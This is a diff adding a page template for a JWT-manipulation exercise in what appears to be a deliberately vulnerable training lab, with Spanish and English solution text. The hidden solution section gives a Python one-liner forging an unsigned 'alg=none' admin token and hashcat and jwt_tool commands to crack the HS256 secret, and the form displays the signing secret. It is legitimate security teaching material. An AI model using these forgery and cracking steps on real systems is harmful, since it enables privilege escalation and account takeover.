@@ -1,0 +1,120 @@
+{% extends "base.html" %}
+{% block title %}JWT Manipulation – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <!-- Generate token -->
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)">
+      <i class="ph ph-key text-sm"></i> Generar Token
+    </div>
+    <form method="POST" action="/jwt" class="space-y-3">
+      <input type="hidden" name="action" value="generate" />
+      <div class="grid grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Username</label>
+          <input type="text" name="username" value="guest" class="hl-input" />
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Role</label>
+          <input type="text" name="role" value="user" class="hl-input" />
+        </div>
+      </div>
+      <button type="submit" class="btn-primary">
+        <i class="ph ph-seal text-sm"></i> Generar JWT
+      </button>
+    </form>
+    {% if token %}
+    <div class="mt-4 p-3 rounded-lg border text-xs font-mono break-all bg-dark-900 border-gray-700" style="color:var(--hl-primary)">
+      {{ token }}
+    </div>
+    <div class="text-xs text-gray-500 mt-2">Secreto usado: <code class="text-yellow-400">{{ secret }}</code></div>
+    {% endif %}
+  </div>
+
+  <!-- Verify token -->
+  <div class="hl-card mb-4">
+    <div class="text-xs font-semibold uppercase tracking-wider mb-4" style="color:var(--hl-primary)">
+      <i class="ph ph-shield-check text-sm"></i> Verificar / Manipular Token
+    </div>
+    <form method="POST" action="/jwt" class="space-y-3">
+      <input type="hidden" name="action" value="verify" />
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">JWT Token</label>
+        <input type="text" name="token" placeholder="header.payload.signature"
+               class="hl-input font-mono" value="{{ token or '' }}" />
+      </div>
+      <button type="submit" class="btn-primary">
+        <i class="ph ph-magnifying-glass text-sm"></i> Verificar
+      </button>
+    </form>
+
+    {% if decoded %}
+    <div class="mt-4 p-3 rounded-lg border bg-dark-900 border-gray-700">
+      <div class="text-xs text-gray-400 mb-2 font-medium">Payload decodificado</div>
+      <pre class="text-green-400 text-xs">{{ decoded | tojson(indent=2) }}</pre>
+      {% if decoded._vuln is defined %}
+      <div class="mt-2 text-xs text-red-400 font-semibold">
+        <i class="ph ph-warning-circle"></i> {{ decoded._vuln }}
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+    {% if error %}
+    <div class="mt-3 alert-error text-xs">{{ error }}</div>
+    {% endif %}
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Ataque 1: alg=none</h3>
+    <ol>
+      <li>Genera un token legítimo y decodifica el header (base64url).</li>
+      <li>Cambia <code>"alg":"HS256"</code> por <code>"alg":"none"</code> en el header.</li>
+      <li>Modifica el payload: cambia <code>"role":"user"</code> a <code>"role":"admin"</code>.</li>
+      <li>Elimina la firma (deja la cadena vacía después del último punto).</li>
+      <li>Envía el token manipulado: el servidor lo acepta sin verificar la firma.</li>
+    </ol>
+    <pre>python3 -c "
+import base64, json
+h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
+print(f'{h}.{p}.')
+"</pre>
+    <h3>Ataque 2: Fuerza bruta al secreto</h3>
+    <ol>
+      <li>Usa <strong>hashcat</strong> o <strong>jwt_tool</strong> para crackear el secreto HS256.</li>
+    </ol>
+    <pre>hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py TOKEN -C -d rockyou.txt</pre>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">jwt_tool</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">jwt.io</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Attack 1: alg=none</h3>
+    <ol>
+      <li>Generate a legitimate token and base64url-decode the header.</li>
+      <li>Change <code>"alg":"HS256"</code> to <code>"alg":"none"</code> in the header.</li>
+      <li>Modify the payload: change <code>"role":"user"</code> to <code>"role":"admin"</code>.</li>
+      <li>Remove the signature (leave the string empty after the last dot).</li>
+      <li>Send the manipulated token — the server accepts it without verifying the signature.</li>
+    </ol>
+    <pre>python3 -c "
+import base64, json
+h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
+p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
+print(f'{h}.{p}.')
+"</pre>
+    <h3>Attack 2: Brute force the secret</h3>
+    <ol>
+      <li>Use <strong>hashcat</strong> or <strong>jwt_tool</strong> to crack the HS256 secret.</li>
+    </ol>
+    <pre>hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py TOKEN -C -d rockyou.txt</pre>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">jwt_tool</span> <span class="tools-badge">hashcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">jwt.io</span></div>
+  </div>
+</div>
+{% endblock %}
